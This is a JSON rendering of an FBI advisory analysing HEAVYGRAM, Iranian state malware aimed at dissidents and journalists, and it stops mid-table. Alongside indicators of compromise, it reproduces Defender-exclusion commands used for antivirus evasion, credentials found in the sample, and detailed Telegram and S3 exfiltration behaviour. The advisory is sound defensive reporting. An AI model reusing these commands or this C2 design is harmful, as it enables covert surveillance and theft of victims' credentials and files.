@@ -1,0 +1,762 @@
+[
+ {
+  "id": "p1",
+  "text": "# Update on Government of Iran Cyber Actors' Deployment of Telegram C2 to Push Malware to Identified Targets"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing\n> - Date: 2026-09-15\n> - URL: https://www.ic3.gov/CSA/2026/260915.pdf\n> - PDF SHA-256: 488c9d030f938ec615ddaef90c8591aa6b30f92778a7dd540bd5bfe26bac8022 (`source.pdf`, 55 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (110 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Update on Government of Iran Cyber Actors’\nDeployment of Telegram C2 to Push Malware to\nIdentified Targets"
+ },
+ {
+  "id": "p4",
+  "text": "Summary\nThe Federal Bureau of Investigation (FBI) is releasing this FLASH to disseminate a detailed\nmalware analysis of the HEAVYGRAM malware. The FBI assesses that Iranian cyber actors are\nusing HEAVYGRAM malware to conduct malicious cyber activity to target Iranian dissidents,\njournalists opposed to Iran, and other opposition groups around the world on behalf of the\nGovernment of Iran’s Ministry of Intelligence and Security (MOIS). MOIS cyber actors likely use\nthis malware to collect intelligence, conduct data leaks, and inflict reputational harm against\ntheir intended targets.\nThe FBI assesses MOIS cyber actors have deployed multiple versions of the malware to infect\nvictim systems. The victim profile included Iranian dissidents, journalists opposed to Iran,\nmembers of organizations with beliefs counter to Government of Iran narratives, and other\nindividuals Iran perceives as a threat to the Iranian government. Iranian cyber actors have used\nsocial engineering to successfully deliver the malware and infect victims. The malware samples\nanalyzed were categorized as masquerading malware (stage 1), persistent implant (stage 2), and\nrelated stage 2 malware that contained additional or unique functions.\nThe FBI analyzed seven samples obtained through investigations. The actors used social\nengineering via social media platforms such as Telegram, WhatsApp, and Instagram to\ncommunicate with victims while offering IT services. Upon accepting IT services, victims would\neither download AnyDesk and potentially provide actors with access strings or victims would\ndownload a malware file masquerading as a program installer that the victim used which started a\nchain of infection. A subset of malware was modular in behavior and relied upon development\nsimilarities. The cyber actors have used this malware dating back to the Fall of 2023.\nThis is an update to previously published FLASH-20260320-001, entitled “Government of Iran\nCyber Actors Deploy Telegram C2 to Push Malware to Identified Targets.” This document provides\na more detailed malware analysis with additional IOCs previously not included in FLASH-\n20260320-001.The FBI urges organizations to use the IOCs and detection signatures in this FLASH"
+ },
+ {
+  "id": "p5",
+  "text": "to identify HEAVYGRAM malware samples. If identified, follow guidance in the Recommended\nMitigation section."
+ },
+ {
+  "id": "p6",
+  "text": "Recommendations\nThe FBI recommends caution with regards to receiving emails or other online communications\nfrom unknown individuals, or communications of an unfamiliar nature from known individuals.\n   1. Ensure your devices are updated with latest operating system and install software updates\n      regularly\n   2. Only download software from trusted sources, such as official app stores or vendor\n      websites\n   3. Enable antivirus or anti-malware software on your device and run antivirus software\n      regularly\n   4. Use strong, unique passwords and enable multi-factor authentication\n   5. Report suspicious emails or messages to the email client. If you suspect a crime, please\n      report to your local FBI field office."
+ },
+ {
+  "id": "p7",
+  "text": "Technical Details\nMalware Overview"
+ },
+ {
+  "id": "p8",
+  "text": "MOIS cyber actors used social engineering via social media platforms such as Telegram,\nWhatsApp, and Instagram to communicate with victims while offering IT services. Upon accepting\nIT services, victims would either download AnyDesk and potentially provide the actors with\naccess strings or download a malware file masquerading as a program installer that the victim\nused which started a chain of infection. A subset of malware was modular in behavior and relied\nupon development similarities. Cyber actors used a combination of malware samples to\ncompromise victim machines."
+ },
+ {
+  "id": "p9",
+  "text": "Figure 1. Observed Behavioral Clusters"
+ },
+ {
+  "id": "p10",
+  "text": "Masquerading Application"
+ },
+ {
+  "id": "p11",
+  "text": "Pictory_premium_ver9.0.4.exe\n      File   PE32 executable (GUI) Intel 80386, for MS Windows\n     MD5     1E6B601F733BC40EAA58916986BFC5B9\n    SHA1     704119320F7ED10DC7707833218468D455D3C5FD\n  SHA256     E8B633DCAD173EB41EF02686B46779A4A0E53DF7F6C63039A798F2DB5EB83AFC\n Compiler    Embarcadero Delphi(11.x Alexandria++)[-]\n   Linker    Turbo Linker(2.25*,Delphi)[GUI32,admin]"
+ },
+ {
+  "id": "p12",
+  "text": "Malware sample, Pictory_premium_ver9.0.4.exe, masqueraded as AI video generator, Pictory\nPremium. From VirusTotal, this sample was a resource from URL,\nhttps://sgp1.vultrobjects.com/downloads/pictory/Pictory_premium_ver9.0.4.exe."
+ },
+ {
+  "id": "p13",
+  "text": "The following credentials were found within the malware sample strings.\n       ghazalehmehrjo@gmail.com\n       8384238Fm@#$%^&*"
+ },
+ {
+  "id": "p14",
+  "text": "Upon executing the malware sample, the following GUI appeared."
+ },
+ {
+  "id": "p15",
+  "text": "Figure 2: Masquerading GUI of Pictory Premium – A Windows GUI of a login screen."
+ },
+ {
+  "id": "p16",
+  "text": "During execution, the following files were created.\n       %USERPROFILE%\\AppData\\Roaming\\SMQDService\\config.xml (MD5:\n       AEEA6D6B3E822C89C332C02F8B97A850)\n       %USERPROFILE%\\AppData\\Roaming\\downloaded_file26.txt (MD5:\n       6100234F12594E6B43083CBBAED56AFC)"
+ },
+ {
+  "id": "p17",
+  "text": "%USERPROFILE%\\AppData\\Roaming\\File26.zip (MD5:\n      94779909CC510194900C3CC17D1194C8)"
+ },
+ {
+  "id": "p18",
+  "text": "File, downloaded_file26.txt, contained a base64 encoded zip archive binary. The following\ndisplayed the contents of File26.zip."
+ },
+ {
+  "id": "p19",
+  "text": "Figure 3: Contents of File26.zip – Python dependencies and second stage executable were\n                                 compressed within this archive."
+ },
+ {
+  "id": "p20",
+  "text": "Using the credential from strings, the following GUI appeared."
+ },
+ {
+  "id": "p21",
+  "text": "Figure 4: Masquerading Pictory’s Subscription Tiers – Only the left-most buttons could be\n                                       interacted with."
+ },
+ {
+  "id": "p22",
+  "text": "Upon clicking the left-most “BUY NOW” or “GET FREE TRIAL” buttons, a web request to\ncheckout.pictory.ai occurred via a newly spawned web browser and the following directory was\ncreated which contained the uncompressed version of File26.zip."
+ },
+ {
+  "id": "p23",
+  "text": "C:\\ProgramData\\SMQDServicePackages\\488ht1-8ww648q\\"
+ },
+ {
+  "id": "p24",
+  "text": "There were multiple .pyd files, a zip file, .dll files, a text file (rantom.txt; MD5:\nA3394EF7FFA7E88B2E7EFAEE4617FE04), executable file (smqdservice.exe; MD5:\n7E23FFADB664B0E53D821478A249D84C), and multiple directories."
+ },
+ {
+  "id": "p25",
+  "text": "Figure 5: Comprehensive list of files present after execution – Files and respective location on the\n     compromised machine to include compressed and uncompressed resources including\n                                    rantom.txt and config.xml."
+ },
+ {
+  "id": "p26",
+  "text": "The following antivirus evasion actions were performed which created multiple directory\nexclusions.\n       \"pwsh.exe\" -Command Add-MpPreference -ExclusionPath\n       '%ProgramData%\\MicrosoftDistribution\\sysmain'\n       \"pwsh.exe\" -Command Add-MpPreference -ExclusionPath\n       '%ProgramData%\\SMQDServicePackages\\488ht1-8ww648q'\n       \"pwsh.exe\" -Command Add-MpPreference -ExclusionPath\n       'C:\\Users\\<user>\\Downloads\\Telegram Desktop'"
+ },
+ {
+  "id": "p27",
+  "text": "\"C:\\Windows\\System32\\cmd.exe\" /C powershell -Command \"Add-MpPreference -\nExclusionPath '%ALLUSERSPROFILE%\\MicrosoftDistribution\\sysmain'\"\n\"C:\\Windows\\System32\\cmd.exe\" /C powershell -Command \"Add-MpPreference -\nExclusionPath '%ALLUSERSPROFILE%\\SMQDServicePackages\\488ht1-8ww648q'\"\n\"C:\\Windows\\System32\\cmd.exe\" /C powershell -Command \"Add-MpPreference -\nExclusionPath 'C:\\Users\\<user>\\Downloads\\Telegram Desktop'\"\ncmd.exe /C powershell -Command \"Add-MpPreference -ExclusionPath\n'%ALLUSERSPROFILE%\\MicrosoftDistribution\\sysmain'\"\ncmd.exe /C powershell -Command \"Add-MpPreference -ExclusionPath\n'%ALLUSERSPROFILE%\\SMQDServicePackages\\488ht1-8ww648q'\"\ncmd.exe /C powershell -Command \"Add-MpPreference -ExclusionPath\n'C:\\Users\\<user>\\Downloads\\Telegram Desktop'\"\npowershell -Command \"Add-MpPreference -ExclusionPath\n'C:\\ProgramData\\MicrosoftDistribution\\sysmain'\"\npowershell -Command \"Add-MpPreference -ExclusionPath\n'C:\\ProgramData\\SMQDServicePackages\\488ht1-8ww648q'\"\npowershell -Command \"Add-MpPreference -ExclusionPath\n'C:\\Users\\<user>\\Downloads\\Telegram Desktop'\"\n\"%SAMPLEPATH%\\e8b633dcad173eb41ef02686b46779a4a0e53df7f6c63039a798f2db5e\nb83afc.exe\"\n\"C:\\Windows\\System32\\cmd.exe\" /C powershell -Command \"Add-MpPreference -\nExclusionPath '%%ALLUSERSPROFILE%%\\MicrosoftDistribution\\sysmain'\"\n\"C:\\Windows\\System32\\cmd.exe\" /C powershell -Command \"Add-MpPreference -\nExclusionPath '%%ALLUSERSPROFILE%%\\SMQDServicePackages\\488ht1-8ww648q'\"\n\"C:\\Windows\\System32\\cmd.exe\" /C powershell -Command \"Add-MpPreference -\nExclusionPath '%USERPROFILE%\\Downloads\\Telegram Desktop'\"\npowershell -Command \"Add-MpPreference -ExclusionPath\n'%USERPROFILE%\\Downloads\\Telegram Desktop'\""
+ },
+ {
+  "id": "p28",
+  "text": "Victims’ machines were observed to have initially downloaded the official AnyDesk installer\nand/or masquerading malware within %USERPROFILE%\\Downloads\\Telegram Desktop\\."
+ },
+ {
+  "id": "p29",
+  "text": "File, smqdservice.exe, executed after the extraction to directory,\nC:\\ProgramData\\SMQDServicePackages\\488ht1-8ww648q\\. Refer to the smqdservice.exe\nsection."
+ },
+ {
+  "id": "p30",
+  "text": "Telegram_Authenticator.exe\n      File   PE32 executable (GUI) Intel 80386, for MS Windows\n     MD5     B9086413E7B6A0C6A11C25D14C22615F\n    SHA1     538819C3CFE8057798C5970D01C24582F7375C40\n  SHA256     9014FE4F16F01C0439B261ADE4CF980F460E0DAE46B1EC5F58FD9BC0AF26E531\n Compiler    Embarcadero Delphi(11.x Alexandria++)[-]\n   Linker    Turbo Linker(2.25*,Delphi)[GUI32,signed]"
+ },
+ {
+  "id": "p31",
+  "text": "Malware sample, Telegram_Authenticator.exe, masqueraded as an authenticator application for\nTelegram. Upon executing this malware sample, the following GUI appeared."
+ },
+ {
+  "id": "p32",
+  "text": "Figure 6: Masquerading GUI for an Authentication App – A single field to enter a code."
+ },
+ {
+  "id": "p33",
+  "text": "Upon clicking into the text field, file writes to C:\\ProgramData\\ssh-cache-default\\{8bda3848-\n495e-43f4-8d10-7d37a67f1604} occurred."
+ },
+ {
+  "id": "p34",
+  "text": "Directory, C:\\ProgramData\\ssh-cache-default\\{8bda3848-495e-43f4-8d10-7d37a67f1604},\ncontained multiple Python files, rantom.txt (MD5: 7D3CCE1F9DBAED585B61E6E903D69B9B),\nbase_library.zip, Runtime_SSH.zip, and RuntimeSSH.exe (MD5:\nE51FF37FB431767DCDEC0B5E6D2A786A). There were multiple directories containing Python\ndependencies."
+ },
+ {
+  "id": "p35",
+  "text": "Persistent Implants\nThe malware sample within this group may exist with or without the use of the first stage of\nmalware or masquerading malware. A subset of decompiled Python variable names (i.e.:\nENC_KEY and XML_FILE_PATH) remained the same between these samples hinting potentially the\nsame author."
+ },
+ {
+  "id": "p36",
+  "text": "winappx.exe\n      File   PE32+ executable (GUI) x86-64, for MS Windows\n    MD5      481C5B5E69A08C3DF206C59FD8DDC0DC\n   SHA1      B5CE0CA96072A99DB5D46398B2D61D58437171EF\n SHA256      8B595258CFF63C4F0EF9648ADB54C6AB050BB1D27933ECB3D687D31B51B7BA0C\nCompiler     Microsoft Visual C/C++(2022+)[-]\n   Linker    Microsoft Linker(14.38**)[GUI64,signed]\n  Packer     PyInstaller(-)[-]"
+ },
+ {
+  "id": "p37",
+  "text": "On a victim machine the following command was run.\n       powershell.exe -command Add-MpPreference -ExclusionExtension\n       C:\\ProgramData\\MicrosoftDistribution\\sysmain\\winappx.exe"
+ },
+ {
+  "id": "p38",
+  "text": "Malware sample, winappx.exe, had multiple variants with different hashes. For\n481C5B5E69A08C3DF206C59FD8DDC0DC, the following was its code signing certificate."
+ },
+ {
+  "id": "p39",
+  "text": "Figure 7: Code signing for winappx.exe – The certificate for this specific sample was issued by\n                                   SSL.com and was revoked."
+ },
+ {
+  "id": "p40",
+  "text": "This malware sample made the following web requests.\n      POST request to http://api.telegram.org with content of chrome_passwords.json.\n      PUT request to http://ams1.vultrobjects.com/desktop-va0r68j-ppmppnf12uyt4r5tifjdfh-\n      tron5.\n      GET request to http://www.google.com/"
+ },
+ {
+  "id": "p41",
+  "text": "Static Analysis\nUpon decompiling winappx.exe, the Python file, main.py, existed. Python 3.9 file, main.py,\ncontained logic to create a mutex as shown below.\n       mutex = CreateMutex(None, False, 'euyrsmnszb85sf4444s')\n       PRGeeeerr = GetLastError()\n       if PRGeeeerr == ERROR_ALREADY_EXISTS:\n         sys.exit((-1))"
+ },
+ {
+  "id": "p42",
+  "text": "Python file, main.py, contained the following imports."
+ },
+ {
+  "id": "p43",
+  "text": "•   S3Vultr\n   •   re\n   •   os\n   •   win32event\n   •   win32api\n   •   sys\n   •   winerror\n   •   utils (custom utils.py with more functions)"
+ },
+ {
+  "id": "p44",
+  "text": "Python file, main.py, contained logic to:"
+ },
+ {
+  "id": "p45",
+  "text": "•   Create a mutex\n   •   Write an encrypted configuration file to the file system\n   •   Initialize S3 Bucket variables by reading in configuration file’s token, userId, s3_hostname,\n       s3_secret_key, s3_access_key, and VicName via function, read_config_file()\n   •   Created a keylogger thread with function, KeyLog(), and start it by reading in the\n       configuration file’s Keyloger\n            o Function, send_msg(), was included for returned content and raised exceptions\n   •   Perform initial reconnaissance via reading configuration’s file’s FristRun which was 1 if\n       never ran and 0 when run once"
+ },
+ {
+  "id": "p46",
+  "text": "o If the configuration indicated a 1, five threads were created to start functions,\n           GetChromePass(), ProgramGet(), proc_List(), sysinf(), and send_msg() with the\n           return value of function, ListOFDrive()\n       o Configuration file’s FristRun was changed to 0 via function, change_config_file\n•   Created and started further threads with functions, GetFilePhone, CheckForDevices, and\n    GGetSnap\n•   Created a client object for Vultr S3 API using s3_hostname, s3_secret_key, s3_access_key,\n    and VicName\n       o If an exception was raised, function, NetTrue(), was called and a thread with\n           function, send_msg(), was created and started\n       o NetTrue() was then called outside of the exception block and subsequently\n           create_bucket() method from the Vultr API client\n•   Created and started a thread to beacon       {pc_name} is online now., where pc_name is\n    the computer’s hostname; function, send_msg(), communicated this message\n        o Python function, sleep(), was called for one second\n•   Created and started a thread with function, check_s3_status(), which took the Vultr API\n    client object as an argument\n•   Create and start a thread with function, run_send_file(), after reading token, SendFile, from\n    configuration file and checking if it was 1\n        o The file sent was %ALLUSERSPROFILE%\\ZlibDate\\Settings\\lfgy.Dat\n•   Created and started a thread with function, WhatsappCheker(), after reading token,\n    MyWhatsapp, from configuration file and check if it was 1\n        o Function, WhatsappCheker(), took True as an argument\n        o Process, whatsapp.exe, was terminated, then\n            C:\\ProgramData\\Drivers\\Whatsapp\\WhatssApp.exe was run\n•   Called Python function, sleep(), for 10 seconds; then created and started thread with\n    function, send_logs(), which took the Vultr API client as an argument\n•   The logs sent were in %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n•   Called function, main_loop(), which contained logic to call several functions from utils.py\n        o There was logic to received C2 commands via function, get_update()\n        o There was logic to execute C2 command via function, analyze_command(), or raise\n            an exception\n        o There was logic to indicate to the C2 that the next message was read via function,\n            skip_this_message()"
+ },
+ {
+  "id": "p47",
+  "text": "o If an exception was raised, a file was downloaded via function, download_file(), to\n              %ALLUSERSPROFILE%\\ZlibDate\\CachedFiles along with a call to function,\n              skip_this_message()\n          o Function, skip_this_message(), was called outside of the exception block to mark\n              the next message as read\n          o Python function, sleep(), was called for one second\n   •   Python file, main.py, contained function, analyze_command(), which took as a parameter,\n       message\n          o The parameter, message, was checked if it started with ‘@@’, ‘##’, ‘@’, or ‘#’ (in this\n              order)\n          o Messages that began with ‘@’ were executed with Python’s method, os.popen(),\n              with the message as an argument\n                  ▪ If the length of command output was more than 4096, command output was\n                      saved to file, cmd.Dat, which was subsequently communicated in a thread\n                      with function, send_file()\n                  ▪ If the length of command output was less than 4096, command output was\n                      communicated in thread with function, send_msg()\n          o Messages that began with ‘#’ were passed into function, run_builtin_command(),\n              with the message as an argument; these commands were custom commands or\n              strings that when evaluated led to other surveillance functions within Python file,\n              utils.py, to be called\n          o If an exception was raised, a thread was created and started with function,\n              send_msg()\n   •   Python file, main.py, contained function, run_builtin_command(), which served as a\n       comprehensive check for various command strings from the C2 and call the appropriate\n       function from utils.py to serve the command"
+ },
+ {
+  "id": "p48",
+  "text": "The following were the C2 commands and associated functions called from within function,\nrun_builtin_command().\n  Command String    Function(s) Called   Description\n      ProcessList   proc_List               • Writes encrypted process list\n           whois    send_msg                • Sends string to C2\n              ss    send_screenshot         • Sends host screenshot PNG to C2\n                    send_message"
+ },
+ {
+  "id": "p49",
+  "text": "SendFile    read_config_file     •    Aggregates select files per configuration token,\n                    send_msg                  SendFile\n                    change_config_file   •    Encrypts files within\n                    run_send_file             %ALLUSERSPROFILE%\\ZlibDate\\Settings\\lfgy.Dat\n                                         •    Sends files using Vultr API client with S3 endpoint\n                                         •    Modifies configuration file to reflect sent data and\n                                              disable further communication\n         SysInfo    sysinf               •    Writes encrypted systeminfo command output to\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n                                              via a .Dat file\n DefaultTelegram    TelGet(‘Def’)        •    Writes Telegram installation content to file system in a\n                                              zip file; content includes Windows App Store and\n                                              Portable Telegram variants\n     AllTelegram    TelGet(‘All’)        •    Writes Telegram installation content to file system in a\n                                              zip file; content includes Windows App Store and\n                                              Portable Telegram variants\n   StoreTelegram    GGetTelStore         •    Writes Telegram installation content for Windows App\n                                              Store variant to file system as a zip file\n         ListFile   ListFiles            •    Writes encrypted file listing for all drives to\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n                                              via a .Dat file\n     GetChrome      ChromGet             •    Writes a zip file containing Google Chrome browser\n                                              data for the current user to a .Dat file in\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n      GetMozilla    MozGet               •    Writes a zip file containing Mozilla Firefox browser\n                                              data for the current user to a .Dat file in\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n        GetEdge     EdgGet               •    Writes a zip file containing Microsoft Edge browser\n                                              data for the current user to a .Dat file in\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n       GetOpera                          •    Logic not implemented\n    GetPrograms     ProgramGet           •    Writes encrypted file containing all installed software\n                    ListOfDrive               to a .Dat file in\n                    send_msg                  %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n                                         •    Obtains drive list from A to K and sends it to C2\n      UpdateTro                          •    Logic not implemented\n         GetFile    send_file            •    Sends file to C2\n       GetSelfie                         •    Logic not implemented\nChangeSnapTime      change_config_file   •    Modifies configuration file’s SnapTime token\n      EnableMic     EnableMic            •    Downloads zip file using Vultr API client, extracts it,\n                                              sets persistence in HKCU registry hive, and executes\n                                              C:\\ProgramData\\Drivers\\MicDriver\\MicDriver.exe\n    MyWhatsApp      change_config_file   •    Sets configuration file’s MyWhatsapp token to 1.\n                    MyWhatsapp                Terminates whatsapp.exe process. Runs\n                                              C:\\ProgramData\\Drivers\\Whatsapp\\Whatssapp.exe"
+ },
+ {
+  "id": "p50",
+  "text": "SugWhatsapp      SugWhatsapp          •    Downloads\n                                              C:\\ProgramData\\Drivers\\Whatsapp\\Whatssapp.exe\n                                              and\n                                              C:\\ProgramData\\Drivers\\Whatsapp\\WebView2Loader.\n                                              dll using Vultr API client\n                                         •    Modifies WhatsApp shortcut to link to Whatssapp.exe\n       GetFolder    GetFolderS3          •    Given a path, all files in path are uploaded using Vultr\n                                              API client\n         Runexe     RunExe               •    Runs executable at given path\n ChangeVicName      change_config_file   •    Modifies the configuration file’s VicName token\nGetChromeTelWha     GetChromeTelWha      •    For each Google Chrome profile under the current\n              t     t                         user account, compress the local browser storage for\n                                              WhatsApp and Telegram to a .Dat file in\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\nGetMyWhatSesion     GetMyWhatSesion      •    Compresses contents within\n                                              C:\\ProgramData\\Drivers\\Whatsapp\\User\n                                              Data\\EBWebView\\Default\\Local Storage and\n                                              C:\\ProgramData\\Drivers\\Whatsapp\\User\n                                              Data\\EBWebView\\Default\\Local Storage to a .Dat file\n                                              in\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n   OutlookExtract   outlook_extract      •    Enumerates every top-level mailbox within Outlook\n                                              client via COM while extracting all messages and\n                                              attachments from mailboxes. All content is\n                                              compressed as a zip file in\n                                              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\n   GetStartupApp    send_file            •    Writes command response of wmic startup get\n                                              caption,command to wmic.Dat to a temporary\n                                              directory, then sends it to C2\n    ChangeToken     check_token          •    Parses C2 command using regex\n                    change_config_file   •    Validate targeted hostname matches system\n                    send_msg                  hostname\n                                         •    If validation is successful, modify token and userId\n                                              fields in configuration file to values sent from C2;\n                                              result is sent back to C2 (hereby altering the Telegram\n                                              API authentication key and Chat ID)\n GetChromePass      GetChromePass        •    Extracts, decrypts, and writes all Google Chrome\n                                              credentials to chrome_passwords.json, then sends it\n                                              to C2\n          KeyLog    read_config_file     •    KeyLog() is not implemented.\n                    send_msg\n                    KeyLog\n                    change_config_file"
+ },
+ {
+  "id": "p51",
+  "text": "Python file, config.py, contained multiple variable and value pairs. Notably, the variable,\nS3_hostname, was assigned a value of ams1.vultrobjects.com."
+ },
+ {
+  "id": "p52",
+  "text": "Python file, mycrypto.py, interacted with rantom.txt and imported the following modules."
+ },
+ {
+  "id": "p53",
+  "text": "• cryptography\n   • os\n   • base64\n   • io\n   • PIL\nPython file, mycrypto.py, contained the following functions.\n                Function    Description\n                  stretch      • Rehashes key 8192 times using SHA-256 with an IV\n          StrToStrEncrypt      • UTF-8 variant of BinaryToBinaryEncrypt()\n         StrToStrDecrypt       • UTF-8 variant of BinaryToBinaryDecrypt()\n   BinaryToBinaryEncrypt       • Validates that buffer is a multiple of AESBlockSize and password length\n                                    is not above the maximum length\n                               • Generates two IVs\n                               • Uses stretch() to obtain a key value\n                               • Generates a random key\n                               • Calculates HMAC\n                               • Encrypts binary data and returns cipher in binary format\n   BinaryToBinaryDecrypt       • Obtains cipher, sets a cursor at index 0, and performs the same\n                                    validation as BinaryToBinaryEncrypt()\n                               • Extracts the first IV and updates the cursor\n                               • Uses stretch() to obtain a key value\n                               • Extracts the second IV and HMAC parts\n                               • Verifies HMAC\n                               • Performs AES decrypt\n                               • Returns bytes of decrypted data\n              encryptFile      • Calls encryptStream() on file bytes that have been read in via bytes\n                               • Write encrypted bytes to file\n           myencryptFile       • Writes encrypted bytes to file after calling encryptStream() by passing in\n                                    string data\n          encryptStream        • Like BinaryToBinaryEncrypt()\n                               • Varies by having plaintext is provided as a parameter and the encrypted\n                                    header, payload, and trailer is appended to an output file stream\n                                    provided by the caller throughout the function as opposed to appending\n                                    a buffer returned to the caller\n       myencryptStream         • Like encryptStream()"
+ },
+ {
+  "id": "p54",
+  "text": "•   Varies by having an input buffer as opposed to an input file stream\n                                 containing plaintext data is provided by the caller\n myencryptStreamBase64       •   Like BinaryToBinaryEncrypt()\n                             •   Varies by having that the encrypted header, payload, and trailer is\n                                 appended to an output file stream provided by the caller throughout the\n                                 function as opposed to appending a buffer returned to the caller\n             decryptFile     •   Reads file bytes\n                             •   Write bytes after calling decryptStream()\n           mydecryptFile     •   Reads file bytes\n                             •   Returns result of calling mydecryptStream()\n          decryptStream      •   Similar to BinaryToBinaryDecrypt()\n                             •   Varies by having the use of an input file stream passed by the caller as\n                                 the ciphertext and the use of an output file stream passed by the caller\n                                 to write out the resultant decrypted plaintext as opposed to using a\n                                 buffer passed by the caller as ciphertext and returning a buffer to the\n                                 caller containing the resultant plaintext\n       mydecryptStream       •   Like BinaryToBinaryDecrypt()\n                             •   Varies by having the use of an input file stream passed by the caller as\n                                 the ciphertext and the use of UTF-8 encoding to construct the plaintext\n                                 return buffer as opposed to using a buffer passed by the caller as\n                                 ciphertext and returning a plaintext buffer using binary encoding\n mydecryptStreamBase64       •   Like BinaryToBinaryDecrypt()\n                             •   Varies by having the use of an input file stream passed by the caller as\n                                 the ciphertext and the use of a bytearray() return type instead of a bytes\n                                 return type for the resultant plaintext\n          encrypt_image      •   Encrypts image bytes by using myencryptStreamBase64()\n          decrypt_image      •   Decrypts image bytes by using mydecryptStreamBase64()"
+ },
+ {
+  "id": "p55",
+  "text": "Python file, S3Vultr.py, contained a custom S3Client class. The class used AWS S3 API module,\nboto3, to implement the session creation. Credentials were imported from Python file, config.py,\nto configure the session to ams1.vultrobjects.com. The class included methods to create\nbuckets, list buckets, delete empty buckets, delete buckets by first deleting objects within it, list\nobjects within bucket, download object to destination, download object from specified bucket,\nupload object from source, and delete object."
+ },
+ {
+  "id": "p56",
+  "text": "Python file, utils.py, utilized the following modules."
+ },
+ {
+  "id": "p57",
+  "text": "•   hashlib\n   •   json\n   •   os\n   •   shutil"
+ },
+ {
+  "id": "p58",
+  "text": "• sqlite3\n   • subprocess\n   • time\n   • uuid\n   • winreg\n   • zipfile\n   • pathlib\n   • threading\n   • psutil\n   • requests\n   • win32com\n   • PIL\n   • S3Vultr\n   • mycrypto (custom mycrypto.py)\n   • config (custom config.py)\n   • windows_tools\n   • xml\n   • operator\n   • win32api\n   • win32file\n   • pythoncom\n   • collections\n   • pynput\n   • comtypes\n   • portable_device_api\n   • datetime\n   • winpwnage\n   • ctypes\n   • boto3\n   • base64\n   • crypto\nPython file, utils.py, contained multiple functions to perform surveillance and communicate with\nC2."
+ },
+ {
+  "id": "p59",
+  "text": "Function    Description\n       send_msg        • Calls NetTrue()\n                       • Formats passed in message by replacing “.” With “\\\\.”\n                       • Sends POST request every three seconds until server accepts message\n                            indicated by a valid ok field in the returned response\n        send_file      • Sends a file via a POST request to\n                            https://api.telegram.org/bot<token>/sendDocument\n                       • Deletes file after sending it\n                       • Sends message to C2 if the above actions raised an exception\n send_screenshot       • Sends a screenshot every three seconds via POST request to\n                            https://api.telegram.org/bot<token>/sendPhoto?chat_id=<chat_id> until\n                            server accepts it indicated by a valid ok key in the returned response; the\n                            chat_id is the Group_ID from the configuration file\n                       • Sends message to C2 if the above action raised an exception\n    download_file      • Sends POST request to\n                            https://api.telegram.org/bot<token>/getFile?file_id=<file_id> where token and\n                            file_id are passed in\n                       • Obtains file_path from response\n                       • Sends GET request to https://api.telegram.org/file/bot<token>/<file_path>\n                       • Writes downloaded file to %ALLUSERSPROFILE%\\ZlibDate\\CachedFiles\n                       • Sends message to C2 if the above actions raised an exception\n      get_update       • Sends POST request to https://api.telegram.org/bot<token>/getUpdates\n                       • Returns the JSON response\n                       • Sends message to C2 if the above actions raised an exception\nskip_this_message      • Sends a GET request to\n                            https://api.telegram.org/bot<token>/getUpdates?offset=<update_id> where\n                            the update_id is passed in\n                       • Sends message to C2 if the above action raised an exception\n         GetHash       • Obtains MD5 hash of file\n                       • Sends message to C2 if the above action raised an exception\nListOFLogsToSend       • Traverses %ALLUSERSPROFILE%\\Files and removes directories with no files\n                            or directories\n                       • Returns a list of the remaining directories\n       send_logs       • Uploads files returned by ListOFLogsToSend() to Vultr\n     check_token       • Sends GET request to https://api.telegram.org/bot<token>/getUpdates\n                       • Returns a Boolean based on the JSON response ok key\n                       • Removes the logs after uploading\n                       • Sends message to C2 if the above actions raised an exception\n    CreaateFolder      • Creates directories, %ALLUSERSPROFILE%\\ ZlibDate\\Z84A847FEEB1FC2s,\n                            %ALLUSERSPROFILE%\\ ZlibDate\\CachedFiles, and %ALLUSERSPROFILE%\\\n                            ZlibDate\\Settings\n      SnapName         • A variable, name, is set to time.strftime('%Y%m%d-%H%M%S') then\n                            characters – and 0 through 9 are replaced with empty string and letters a\n                            through j respectively"
+ },
+ {
+  "id": "p60",
+  "text": "•   Returns string with pattern, SN_<name obfuscated>-<first 8 characters of\n                             uuid.uuid4()>-<computer name>\n            MyName       •   A variable, name, is set to time.strftime('%Y%m%d-%H%M%S') then\n                             characters – and 0 through 9 are replaced with empty string and letters a\n                             through j respectively\n                         •   Returns string with pattern, <pass in string>_<name obfuscated>-<first 8\n                             characters of uuid.uuid4()>-<computer name>\n          GGetSnap       •   Obtains screenshot and writes encrypted results to an obfuscated file name\n                             by calling SnapName()\n                         •   File name is renamed to\n                             %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\SN_*.Dat\n                         •   Sends message to C2 if the above actions raised an exception\n         ListOFDrive     •   Returns list of available drives from drive letter A through K\n                         •   Sends message to C2 if the above action raised an exception\n             ListFiles   •   For all drives returned by ListOFDrive(), obtains a list of all files and writes\n                             encrypted results to an obfuscated file name by calling MyName() and passing\n                             string, LF\n                         •   File name is renamed to\n                             %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\LF*.Dat\n                         •   Sends message to C2 if the above actions raised an exception\nListofPortablTelegram    •   Searches all drives returned by ListOFDrive() for portable version of Telegram\n                         •   Returns a list of all directories found\n        GGetTelStore     •   Checks if Microsoft Store version of Telegram is installed by checking\n                             directories in %LOCALAPPDATA%\\Packages with sub-string,\n                             TelegramMessengerLLP\n                         •   Compress the directories that match the above conditions to a temporary file\n                         •   Rename file to\n                             